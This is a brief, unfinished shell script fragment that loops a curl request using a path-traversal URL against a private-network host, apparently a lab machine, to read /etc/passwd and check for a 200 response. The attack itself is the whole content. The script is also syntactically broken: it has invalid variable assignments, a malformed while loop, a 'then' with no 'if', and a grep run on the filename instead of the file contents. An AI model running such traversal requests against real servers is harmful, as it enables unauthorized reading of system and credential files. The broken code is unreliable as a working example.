$i=1
$path=
while $i; do
	curl -v --path-as-is http://192.168.56.105/../../../../etc/passwd >/tmp/ew
    echo /tmp/ew | grep -q "(200)"; then
	
